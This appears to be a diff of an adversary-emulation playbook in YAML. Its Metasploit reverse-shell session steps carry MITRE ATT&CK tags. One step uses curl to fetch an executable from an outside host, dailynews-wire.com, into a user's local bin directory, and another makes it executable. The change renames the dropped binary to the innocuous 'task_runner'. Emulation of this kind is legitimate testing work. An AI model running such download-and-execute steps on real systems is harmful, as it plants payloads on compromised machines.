@@ -214,7 +214,7 @@ commands:
 
   # download the veiltransfer_client_linux executable
   - type: msf-session
-    cmd: curl -o /home/judy/.local/bin/veiltransfer_client_linux dailynews-wire.com:8082/index
+    cmd: curl -o /home/judy/.local/bin/task_runner dailynews-wire.com:8082/index
     session: revshell
     metadata:
       techniques: "T1105"
@@ -242,7 +242,7 @@ commands:
   # make the veiltransfer client binary executable
   - type: msf-session
     session: revshell
-    cmd: chmod +x /home/judy/.local/bin/veiltransfer_client_linux 
+    cmd: chmod +x /home/judy/.local/bin/task_runner 
     metadata:
       techniques: "T1222.002"
       tactics: "Defense Evasion" 
